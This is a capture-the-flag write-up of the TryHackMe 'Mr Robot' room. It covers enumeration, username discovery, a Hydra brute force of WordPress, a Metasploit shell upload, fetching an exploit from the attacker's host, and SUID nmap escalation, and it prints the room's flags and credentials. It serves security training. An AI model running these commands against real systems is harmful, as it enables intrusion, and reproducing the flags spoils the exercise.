# Lab Report - Mr Robot CTF


# Overview 
- **Difficulty**: Medium 
- **Platform**: Linux
- **Link**: https://tryhackme.com/room/mrrobot

## Resolution Summary 
**We discovered available services with an `Nmap` scan, revealing SSH and two HTTP servers running a `WordPress` CMS. We enumerated hidden directories with `GoBuster`, uncovering a wordlist and the first flag in `/robots.txt`. We identified a valid username (`elliot`) through differing error messages on the login page, then brute-forced the password with `Hydra`. With admin access, we spawned a `Meterpreter` shell via `Metasploit`. We then cracked an MD5 hash found on the system to switch to the `robot` user and retrieve the second flag. Finally, we escalated to root by abusing the `SUID` bit set on `nmap`, spawning a root shell via its interactive mode.**

# Information Gathering 
- **First and foremost, we performed an `Nmap` scan in order to map the target network's architecture, we also added the `-sV` flag in order to scan for software's version:**
```bash 
sudo nmap -sV 10.10.228.255 
```

- **We obtained the following results:**
```bash
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd
443/tcp open  ssl/http Apache httpd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- **From there, we started by investigating the two available web servers.**

## HTTP (80)
- **We uncovered a page that hosted many content related to the TV show, and it was accessible from a customized command line that only allowed a couple of tailor-made commands.** 

- **Upon inspecting the Source Page, we suspected that the website was built with the WordPress CMS.** 

- **After our quick inspection, we ran on the background `GoBuster` to search for hidden web directories:** 
```bash
gobuster dir -u http://10.10.228.255 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt -k -t 64
```

- **The scan lead to many resources, here is a list of the most important/interesting ones:**
	- `/login`: a WordPress login page.
	- `/admin/index.html`: gives out a user IP `208.185.115.6`.
	- `/feed`: may provide the WordPress CMS version `4.3.1` (potential CVE).
	- `/robots.txt`: which points out one of the key files `key-1-of-3.txt` and `fsocity.dic`.

- **The most interesting things here where the hints in the `/robots.txt` directory, since these are no rules that can be applied to bots.**
- **We tried to use them as directories to see if we were able to access additional resources.** 

- **We accessed the `http://10.10.228.255/fsocity.dic` page and we found a wordlist (may be useful for the login page ?), hence we uploaded it to our local machine: 
```bash
curl http://10.10.228.255/fsocity.dic > wordlist.txt
```

- **We also accessed the `http://10.10.228.255/key-1-of-3.txt` page and we found the first flag:
	- `073403c8a58a1f80d943455fb30724b9`.

- **From here, we enumerated enough the web server on port 80 and we moved on to the second web server for further recon.** 

+Enumerate the WP CMS with `wpscan` ? 

## HTTP (443)
- **It seemed that it was a dead end since we were redirected to the previous web page.** 
- **Hence, we proceeded with the exploitation stage.** 
# Exploitation 
- **For starters, the WordPress version we found earlier is vulnerable to RCE (when authenticated), here is the [link](https://www.exploit-db.com/exploits/50255) to the exploit.**
- **However, we held into this for the moment and we tried to work our way around the login page.** 

- **In order to find what fields are used in the login form and to do some manual tests, we launched `Burp Suite`, we intercepted a login request then we sent it to `Repeater`.** 
- **We found the following relevant fields:** 
```HTML
log=test&pwd=test&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.145.172%2Fwp-admin%2F&testcookie=1
```

- **Hence, we attempted a brute force attack with `ffuf` and using the wordlist we recovered earlier:**
```bash
ffuf -w /home/kali/wordlist.txt:FUZZ -X POST -d "log=test&pwd=FUZZ&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.145.172%2Fwp-admin%2F&testcookie=1" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.30.216/wp-login.php -fc 200
```

- **However, we noticed that it was incredibly slow, and since we were facing a WordPress CMS, we decided to use `wpscan` instead.**
```bash
wpscan --url http://10.10.145.172 -U user.txt -P wordlist.txt 
```
- **We tried the following users: `mrrobot`, `admin`, `root`, `fsociety`, `friend` and `elliot`.**

- **We noted a strange behavior, the brute force process took much more time (40 mins instead of 10) when we used the username `elliot`, which could mean that it is a valid user (so WordPress performs full authentication logic).**

- **To confirm this, we used `Burp Suite Repeater` again and attempted to see if we received a different error message for this user, which was the case:**
```HTML
<div id="login_error">	<strong>ERROR</strong>: The password you entered for the username <strong>elliot</strong> is incorrect.
```

- **Whereas the result for other usernames was:**
```HTML
<div id="login_error">	<strong>ERROR</strong>: Invalid username.
```

- **In order to perform a faster brute force attack, we used `Hydra`:**
```bash
hydra -l elliot -P reversed.txt 10.10.238.196 http-post-form \ 
"/xmlrpc.php:<?xml version=\"1.0\"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>^USER^</value></param><param><value>^PASS^</value></param></params></methodCall>:Incorrect"
```

- **It allowed us to uncover the following valid credentials:**
	- `elliot:ER28-0652`.

- **Since we gained access to a WP admin panel, we attempted to gain a shell using the following on `Metasploit`:**
```bash
msfconsole 
use unix/webapp/wp_admin_shell_upload
#set all the options, do not modify TARGETURI
set WPCHECK false #This is primordial, otherwise it won't work
run
```

- **We finally obtained a `Meterpreter` shell on the target.**
# Privilege Escalation 
- **Once we got a shell, we were not able to read the second flag located at `/home/robot`. However, we had access to the `password.raw-md5` file which stored the `robot` user password.**

- **Hence, we cracked the hash using [hashes.com](https://hashes.com/en/decrypt/hash) then we attempted to change user, and we succeeded:** 
```bash
su robot 
abcdefghijklmnopqrstuvwxyz #Password to enter (cracked MD5 hash)
```

- **We also upgraded a little bit our current shell with:**
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

- **From there, we were able to get the second flag:**
	- `822c73956184f694993bede3eb39f959`

- **After that, we needed to gain root access over the machine.**
- **For that purpose, we began by simply getting the kernel version, looking for easy attack vectors:** 
```bash
uname -a
#Result
Linux ip-10-10-238-196 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
```

- **The Kernel happened to be vulnerable to `DirtyPipe` exploit, hence we attempted to use it for local privilege escalation:**
```bash
#On our machine
gcc -static 50808.c -o exploit
python3 -m http.server 8000 

#On target machine
cd /tmp #World-writable directory
wget http://10.11.139.102:8000/exploit
```
- **However, this failed because we have no execution permission anywhere. Hence, we started looking for a writable cronjob.**

- **We began by listing cronjobs and investigating required permissions:**
```bash
cat /etc/crontab
#Result
# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
48 * * * * bitnami cd /opt/bitnami/stats && ./agent.bin --run -D
```

- **The first and last cronjob seemed interesting, but we had no write permissions over the executable.** 

- **Next, we looked for binaries that have SUID bit set:**
```bash
find / -perm -u=s -type f 2>/dev/null
```

- **And we found that `nmap` runs with SUID bit set, hence we used the following to spawn a root shell (available on [GTFOBins](https://gtfobins.github.io/gtfobins/nmap/#sudo), in the sudo section):**
```bash
nmap --interctive
#You enter an nmap shell session
!sh
#This spawns a root shell
```

- **Finally, we were able to access the last flag:** 
	- `04787ddef27c3dee1ee161b21670b4e4`
# Trophy 
**User.txt → `822c73956184f694993bede3eb39f959`** 

**Root.txt → `04787ddef27c3dee1ee161b21670b4e4`**

# Remediation Summary
- **Avoid explicit error message**: It can allow for user enumeration.
- **Restrict SUID bit permissions on binaries**: binaries like `nmap` can prove to be dangerous when exploited with SUID bit set. 

# Lessons Learned
- **WP Admin panel**:
	- Use the `unix/webapp/wp_admin_shell_upload` to spawn a shell on the target.
	- Set WPCHECK to false if WP is not detected on the target. 

- **Don't overlook any binary**: 
	- Although some binaries may look not that important, always double check on GTFOBins (if known binary) or perform some manual testing. 

